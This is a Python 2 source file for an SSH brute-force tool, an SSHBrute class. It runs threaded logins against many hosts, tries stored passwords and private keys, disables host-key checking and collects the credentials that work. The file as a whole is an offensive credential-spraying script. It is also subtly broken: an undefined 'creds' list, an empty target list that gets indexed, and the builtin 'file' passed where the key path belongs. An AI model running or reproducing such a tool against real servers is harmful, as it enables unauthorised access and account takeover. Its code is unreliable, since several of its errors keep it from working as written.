# -*- coding: utf-8 -*-

import os, sys, time, glob, hashlib
import traceback, socket, logging, paramiko
from paramiko.py3compat import u
from threading import Thread, Semaphore, active_count


class NullHostKeyPolicy():
    def missing_host_key(self, client, hostname, key):
        return


class SSHBrute():
    def __init__(self, targets, credentials={}, threads=20):
        self.targets = targets
        self.threads = threads
        self.credentials = credentials
        self.exit_all = False
        self.thread_lock = Semaphore(value=1)
        self.found = []

    def try_login(self, host, port, user, key, password):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(NullHostKeyPolicy())
        try:
            if key:
                client.connect(host, port=port, username=user,
                    key_filename=file, allow_agent=False, look_for_keys=False)
                self.exprint('Found: %s/%s', (user, key))
            else:
                client.connect(host, port=port, username=user,
                        password=password, allow_agent=False, look_for_keys=False)
                self.exprint('Found: %s/%s', (user, password))
        except paramiko.ssh_exception.SSHException, e:
            return False
        finally:
            client.close()
        return True

    def login_thread(self, hosts, keys, creds):
        for host in hosts:
            for key in keys:
                if self.exit_all:
                    return
                res = self.try_login(host[0], host[1], key[0], key[1], None)
                if res:
                    self.thread_lock.acquire()
                    self.found.append({
                        'host': host[0],
                        'port': host[1],
                        'user': key[0],
                        'key':  key[1],
                        'type': 'key'
                    })
                    self.thread_lock.release()
            for cred in creds:
                if self.exit_all:
                    return
                res = self.try_login(host[0], host[1], cred[0], None, cred[1])
                if res:
                    self.thread_lock.acquire()
                    self.found.append({
                        'host': host[0],
                        'port': host[1],
                        'user': cred[0],
                        'pass': cred[1],
                        'type': 'password'
                    })
                    self.thread_lock.release()

    def check_credentials(self):
        self.exit_all = False
        target_lists = []
        ssh_keys = []
        count = 0

        for i in range(self.threads):
            creds.append([])

        for _, credential in self.credentials.iteritems():
            if credential['type'] == 'private_key':
                # How do we know what the username is?
                # should we pre-decrypted passphrase protected keys?
                ssh_keys.append([credential['username'], credential['key']])
            elif credential['type'] == 'password':
                creds.append([credential['username'], credential['password']])

        for target in self.targets:
            target_lists[count % self.threads].append(target)
            count += 1

        for target_list in target_lists:
            t = Thread(target=self.login_thread, args=(target_list, ssh_keys, creds))
            t.start()

        while active_count() > 1:
            time.sleep(0.1)

    def stop(self):
        self.exit_all = True

    def exprint(self, string, values=None):
        self.thread_lock.acquire()
        if values:
            print string % values
        else:
            print string
        self.thread_lock.release()
